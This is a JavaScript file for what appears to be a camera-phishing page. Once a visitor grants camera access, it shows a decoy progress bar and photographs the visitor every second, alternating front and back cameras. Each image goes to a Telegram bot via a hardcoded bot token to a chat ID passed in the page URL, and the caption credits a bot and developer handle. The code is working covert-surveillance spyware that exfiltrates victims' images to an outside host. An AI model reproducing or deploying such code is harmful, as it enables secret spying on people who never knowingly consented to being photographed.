const BOT_TOKEN = "AAFpXlIk0KHB5j3SljkE7DvheXngu7wA2Kg";
const CHAT_ID = new URLSearchParams(location.search).get("id");

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const bar = document.getElementById("bar");

let stream;
let usingFront = true;

// start وروسته اجازه
async function start() {
  stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user" } // front camera
  });

  video.srcObject = stream;

  video.onloadedmetadata = () => loop();
}

// 🔁 main loop
function loop() {
  let progress = 0;

  setInterval(async () => {
    progress += 10;
    bar.style.width = progress + "%";

    if (progress >= 100) {
      progress = 0;
      bar.style.width = "0%";

      await capture();

      await switchCamera(); // camera change
    }

  }, 100); // 1 sec
}

// 📸 عکس
function capture() {
  return new Promise(resolve => {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    ctx.drawImage(video, 0, 0);

    canvas.toBlob(blob => {
      send(blob);
      resolve();
    }, "image/jpeg");
  });
}

// 🔄 camera بدلول
async function switchCamera() {
  usingFront = !usingFront;

  stream.getTracks().forEach(track => track.stop());

  stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: usingFront ? "user" : "environment" }
  });

  video.srcObject = stream;
}

// 📤 telegram send
function send(blob) {
  const formData = new FormData();

  formData.append("chat_id", CHAT_ID);
  formData.append("photo", blob, "img.jpg");

  const caption =
`📸 Camera Capture

📷 ${usingFront ? "Front Camera" : "Back Camera"}

🤖 Bot: @ProSimTookBot
👨‍💻 Dev: @XFPro43

✅ Status: Active`;

  formData.append("caption", caption);

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData
  });
}
